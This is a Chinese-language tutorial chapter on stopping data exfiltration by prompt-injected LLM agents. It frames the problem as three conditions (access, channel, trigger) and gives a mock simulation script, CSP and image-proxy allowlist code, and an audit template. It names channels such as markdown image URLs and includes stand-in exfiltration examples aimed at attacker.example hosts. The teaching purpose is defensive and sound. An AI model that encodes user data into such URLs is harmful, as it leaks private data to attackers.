注入让模型"想"做某件事。但想和做成之间还有距离。这一节讲的是**外泄做成的条件** —— 因为理解这些条件，才知道防护该往哪放。

## 三个必须同时成立的条件

**一、访问：它够得着数据。** 模型（或它调用的工具）能读到那份数据。

**二、通道：它送得出去。** 存在一条能把数据发到攻击者手里的路径 —— HTTP 请求、邮件、图片 URL、甚至写进一个攻击者能读到的地方。

**三、触发：它去做了。** 模型决定读那份数据、并把它送出去。

三者缺一不可。我把它们逐个拿掉，跑了五种组合：

```text
什么都不做                  ✅ 被拦住（卡在：触发）
只给通道（没有数据）         ✅ 被拦住（卡在：访问）
只给访问（没有出口）         ✅ 被拦住（卡在：通道）
访问 + 通道，但模型不去读     ✅ 被拦住（卡在：触发）
三要素齐全                  ❌ 外泄成功
```

（实跑数据，2026-10-09。纯本地模拟，因为要测的是**机制**，不是模型。）

看最后两行：**访问和通道都给齐了，但模型不去读，就什么也不会发生。** 反过来说 —— 只要有触发，另外两个都齐，外泄就成功。

## 砍哪一个最有效

这是本节的核心。三个条件的可控程度**差别很大**：

| 要素 | 防护手段 | 可靠性 |
|---|---|---|
| **触发** | 提示词、输入标注、内容过滤 | **低** —— 成功率取决于攻击手法，第 2 章实测过（6/6 vs 0/6） |
| **访问** | 沙箱与最小权限（第 16 章） | **高** —— 确定性的，读不到就是读不到 |
| **通道** | 默认禁网 + 域名白名单 | **高** —— 同样是确定性的 |

**砍触发是最难的，也是最不可靠的。** 因为触发是模型的判断，而判断可以被更好的注入说服 —— 你只能降低概率，不能确定地消除。

而砍访问和砍通道都是**确定性**的：权限拒绝不会因为注入写得更好而失效。

所以外泄防护的重点不在「说服模型别外发」，而在**即使它想外发也没有路**。

这和第 16 节结尾那条结论是同一条：**面对注入，不要在"说服模型"上投入过多，要在"即使模型被说服也做不成"上投入。**

## 通道比你想的多

"通道"这个词容易让人只想到 HTTP 请求。但实际可达的通道有很多，而它们的防护方式不同：

| 通道 | 例子 | 怎么收 |
|---|---|---|
| HTTP 出站 | 工具直接请求攻击者域名 | 域名白名单 + 禁内网 |
| 邮件 | 调用发邮件工具 | 工具级审批（第 19 章） |
| URL 参数 | 把数据拼进一个图片地址 | **渲染层也要拦** —— 图片加载是浏览器发的请求 |
| 写文件 | 写进一个攻击者能读的地方 | 文件系统沙箱 |
| 错误信息 | 报错里带上数据 | 出站内容脱敏（第 16 节） |
| 日志 | 数据进了一个共享的日志系统 | 日志访问控制（第 16 节） |

第三行值得单独说（**渲染层**：把 markdown 变成可见页面、并顺带加载图片的那一层，可能在浏览器里，也可能在服务端）。**第 8 章实测过一个相关现象 —— 给模型一个 URL 图像，服务端会去下载它。** 那么反过来，如果模型能把数据编码进一个 URL，让渲染层去请求它，就是一个不走工具调用、不走 HTTP 工具的通道。**它绕过了你对"工具"的检查。**

这正是"通道要比工具清单更宽"的原因：**任何能让你的系统发起网络请求的地方，都是一个潜在通道** —— 包括图片加载、网页预览、webhook 回调。

## 一个反过来的检查：把三要素当审计清单

这套框架的实用价值在于，它可以当一份检查清单用。对自己的系统问三个问题：

**一、这个 agent 能读到的最敏感的数据是什么？** 如果答案是"生产数据库"，那么"访问"这一环就是敞开的 —— 而它本来可能是可以收窄的（第 16 节的最小权限）。

**二、它能发起的网络请求有哪些？** 注意不只是工具清单 —— 还要算上渲染层、回调、以及任何"看起来与网络无关"的组件。

**三、触发这一环，我做了哪些降低概率的措施？** 注意这里的措辞：**降低概率**，不是消除。把这一点想清楚，你就不会把提示词当成防线。

三个问题里，第二个最容易被漏。因为"通道"往往不在安全评审的视野里 —— 它可能是一行 `img src`，一个看起来无害的预览功能。


## 一个具体的判断：哪些数据本就不该让 agent 碰到

三要素里的"访问"是最好砍的一环，但砍它需要先回答一个问题：**这份数据，这个 agent 真的需要吗？**

实际项目里经常出现的情况是：agent 需要的其实只是**数据的某个投影**，而它拿到的是整张表。

举几个具体的收窄方式：

- 需要"这个用户有没有下过单" → 给它一个返回布尔值的工具，而不是一个能查订单表的工具
- 需要"这个月的销售总额" → 给它一个返回聚合值的工具，而不是原始明细
- 需要"文档里关于退款的那一段" → 先检索出那一段再给它，而不是把整份文档塞进上下文

这三种做法的共同点是：**把"读数据"变成"调接口"。** 接口的返回形状由你定义，所以你能保证它只返回必要的信息 —— 而"读数据"的返回形状由数据决定，你控制不了。

这条和第 5 章那个"让代码算而不是让模型算"是同一个思路的两面：**能由你的代码确定的，就不要交给模型（或数据源）决定。**

## 还有一个经常被忽略的：上下文本身就是一份拷贝

最后补一个角度。数据被读进上下文之后，它**同时存在于好几个地方**：

- 你的轨迹日志（第 15 节）
- 模型厂商的服务器（每轮发送）
- 后续每一轮的消息历史

也就是说，"访问"这个动作一旦发生，**数据的副本数就变成了 N**。而砍掉"通道"只能防住"从这份副本再往外发"，防不住"副本本身已经存在"。

所以最小权限的意义不只是"防外泄"，还有一层是**减少副本** —— 让敏感数据尽量不要进入上下文，因为一旦进去，它就在好几个你控制不了的地方留下了痕迹。这也是第 16 节那条"凭据不该进入上下文"的同一个道理，只是从凭据扩展到了所有敏感数据。
## 完整可运行代码

下面这段代码把三要素逐个拿掉，演示它们各自的作用，以及为什么"砍访问"和"砍通道"比"砍触发"可靠。

```python
"""数据外泄的三要素：访问、通道、触发。

外泄要成功，三个条件必须同时满足。这个脚本把三要素逐个拿掉，看结果如何。
纯本地（用模拟的读写动作，不依赖外部服务）—— 要测的是**机制**，不是模型。
实跑状态：2026-10-09。
"""

SECRET = "客户表：13800138000 / 张三 / 余额 12800"


def try_exfiltrate(has_access, has_channel, has_trigger):
    """返回 (是否成功外泄, 卡在哪一步)。"""
    log = []
    # 触发：模型有没有去拿这份数据
    if not has_trigger:
        log.append("模型没有去读这份数据（没有触发）")
        return False, "触发", log
    log.append("① 触发：模型决定读取客户表")
    # 访问：它够不够得着
    if not has_access:
        log.append("读客户表 → 权限拒绝")
        return False, "访问", log
    log.append("② 访问：读到了「%s」" % SECRET[:12] + "…")
    # 通道：它能不能送出去
    if not has_channel:
        log.append("尝试外发 → 出站被禁（无可用通道）")
        return False, "通道", log
    log.append("③ 通道：通过 HTTP 发往 attacker.example.com")
    return True, None, log


CASES = [
    ("什么都不做", False, False, False),
    ("只给通道（没有数据）", False, True, True),
    ("只给访问（没有出口）", True, False, True),
    ("访问 + 通道，但模型不去读", True, True, False),
    ("三要素齐全", True, True, True),
]

if __name__ == "__main__":
    print("外泄需要三要素同时成立：访问、通道、触发")
    print()
    for label, acc, ch, tr in CASES:
        ok, stuck, log = try_exfiltrate(acc, ch, tr)
        verdict = "❌ 外泄成功" if ok else "✅ 被拦住（卡在：%s）" % stuck
        print("  %-24s %s" % (label, verdict))
        for line in log:
            print("      %s" % line)
        print()
    print("=== 防护的对应关系 ===")
    print("  砍「触发」—— 最难，因为触发是模型的判断，你只能降低概率：")
    print("             提示词、输入标注、内容过滤。成功率取决于攻击手法（第 2 章实测过）。")
    print("  砍「访问」—— 最可靠。沙箱与最小权限（第 16 章）：让它根本读不到。")
    print("  砍「通道」—— 最容易被忽略，也最有效。默认禁网 + 域名白名单。")
    print()
    print("  关键结论：**三要素里，砍「触发」最难且最不可靠，砍另外两个都是确定性的。**")
    print("  所以外泄防护的重点不在「说服模型别外发」，而在「即使它想外发也没有路」。")
```

## 拦住渲染层：CSP 加服务端 URL 白名单

L57 说「渲染层也要拦」，但只说了「图片加载是浏览器发的请求」。拦法有两道，**两道都要**，因为它们的失效模式不同：

**第一道：CSP（内容安全策略）。** 它是一个响应头，告诉浏览器「这个页面允许从哪些来源加载资源」。把它加上，模型生成的图片 URL 就无法把请求发到任意域名：

```http
Content-Security-Policy: default-src 'self'; img-src 'self' https://cdn.example.com; connect-src 'self'; script-src 'self'
```

- `img-src` 管 `<img src>` —— 模型在回答里写 `![](https://attacker.example/x?data=...)` 时，浏览器不会去加载它。
- `connect-src` 管 `fetch` / `XMLHttpRequest` —— 防止前端代码被诱导去请求外部。
- 它拦在**浏览器里**，所以对**服务端渲染**（SSR 时服务端自己去下载图片再内联）无效。

**第二道：服务端 URL 白名单（图片走代理）。** 把 markdown 里的图片地址改写成你自己的代理端点，由代理做白名单校验 —— 判据与第 3 节那段网络代码完全一样：

```python
import ipaddress, socket
from urllib.parse import urlparse, quote

ALLOW_HOSTS = {"cdn.example.com"}
CONNECT_TIMEOUT = 5

def safe_image_url(url: str) -> str | None:
    """通过校验的图片返回代理地址；否则返回 None（渲染成占位图）。"""
    p = urlparse(url)
    if p.scheme != "https":
        return None
    host = (p.hostname or "").lower()
    if host not in ALLOW_HOSTS:                 # 白名单：只放行图片 CDN
        return None
    try:
        ips = {i[4][0] for i in socket.getaddrinfo(host, None)}
    except socket.gaierror:
        return None
    for ip in ips:                              # 二次拒绝：内网 / 元数据 / localhost
        a = ipaddress.ip_address(ip)
        if a.is_loopback or a.is_link_local or a.is_private:
            return None
    return "/img-proxy?u=" + quote(url, safe="")
```

**为什么 CSP 之外还要代理**：CSP 只能约束**浏览器**，而同一个 markdown 可能在服务端被渲染、被导出成 PDF、被别的 agent 再读一遍 —— 那些路径都不经过 CSP。代理把判据放在**数据出站的那一层**，任何渲染器都绕不过。反过来说，只做代理不做 CSP 也不够：代理可能被某条渲染路径跳过，两道一起才覆盖完整。

**失败形态：** 只在渲染时做一次 URL 过滤、之后又原样把 markdown 存回数据库。下一次被别的组件读到（导出、预览、二次总结）时又变成一个可加载的外链 —— **数据只要进了 URL 就已经出去了**，过滤必须发生在**每一次用它发起请求之前**，而且要有「已过滤后仍被重新引入」的兜底（保存时就把不可信 URL 换成代理地址）。

## 投影式接口：真实签名与返回

L104-109 说「把读数据变成调接口」，具体签名就是这种形态 —— 关键是**返回形状由你的接口定义**：

```python
from decimal import Decimal

# ❌ 原始数据：返回形状由数据源决定，你控制不了它带出什么
def get_order(order_id: str) -> dict: ...

# ✅ 投影一：只需要「有没有」，就只返回布尔
def user_has_ordered(user_id: str, sku: str) -> bool:
    ...

# ✅ 投影二：只需要总量，就只返回聚合值
def monthly_sales_total(month: str) -> Decimal:
    ...

# ✅ 投影三：只需要相关段落，就返回检索片段而不是整篇
def refund_passages(doc_id: str, query: str, top_k: int = 3) -> list[dict]:
    """返回 [{"text": "...", "span": [120, 210], "score": 0.83}]"""
    ...
```

返回示例（示例：构造数据，未实跑）：

```json
{
  "tool": "refund_passages",
  "result": [
    {"text": "退款需在签收后 7 日内发起，超期不予受理。", "span": [120, 210], "score": 0.83}
  ]
}
```

**判据：** 问一句「模型要做的判断，需要原始记录吗？」。只做布尔/聚合/片段判断的任务，把它需要的那个投影做成接口 —— 模型看不见的东西，注入也拿不走。这和「让代码算而不是让模型算」是同一个思路：**返回形状能由你确定的，就不要交给数据源确定。**

## 三问清单的数据模板

L86-92 那三个问题，光问一遍记不住。给一份可以逐项填的结构（示例：构造数据，未实跑），字段就是「你能据此写防护」的最小集合：

```json
{
  "agent": "refund-assistant",
  "access": {
    "most_sensitive_data": "客户表（手机号、余额）",
    "fields_visible_to_agent": ["order_id", "amount", "currency"],
    "returns_projection": true,
    "read_tools": ["refund_passages", "order_status"]
  },
  "channels": {
    "tool_outbound": ["https://api.example.com"],
    "render_layer": {"img_src_allow": ["cdn.example.com"], "csp": true},
    "callbacks": [],
    "log_sinks": ["stdout->observability.example.com"]
  },
  "trigger_controls": {
    "input_tagging": true,
    "quarantine_rules": ["imperative+toolname", "url_pattern"],
    "note": "只降低概率，不作为防线"
  }
}
```

**怎么用这份模板：** 每个字段填不出来，就对应一个缺口 —— `channels.render_layer` 填不出，说明你没检查过图片预览；`access.fields_visible_to_agent` 与 `most_sensitive_data` 对不上，说明投影没做到位。它和第 5 节那张四层表是同一类工具：**把「我们考虑了安全」逼成一张填得满或填不满的表。**

## 常见坑

- **只防触发（提示词、过滤）。** 那是最不可靠的一环 —— 第 2 章实测：同类防护的效果从 6/6 到 0/6 都有。
- **只统计"工具"能发起的请求。** 图片加载、网页预览、webhook 回调都是通道，而且能绕过工具层检查。
- **以为读到了也不算什么。** 第 8 章实测过 URL 图像会被服务端下载 —— 数据进 URL 就等于出去了。
- **忘了错误信息和日志也是通道。** 报错里带数据、日志被共享，都是外泄路径。
- **不做三要素清单。** 没有清单，「通道」这一环基本一定会被漏掉，因为它不在安全评审的常规视野里 —— 它可能只是渲染层的一行图片链接。
- **只算「工具」的通道。** 渲染层的图片加载、网页预览、webhook 回调都不在工具清单里，但它们都能发起网络请求 —— 而数据只要进了 URL，就已经出去了。
- **把「降低触发概率」当成「消除风险」。** 提示词只能降低概率；确定性的是砍访问和砍通道。而访问这一环一旦放开，数据的副本就同时存在于日志、厂商服务器和后续每一轮历史里 —— 那时再砍通道，只能防住副本往外走，防不住副本已经存在。
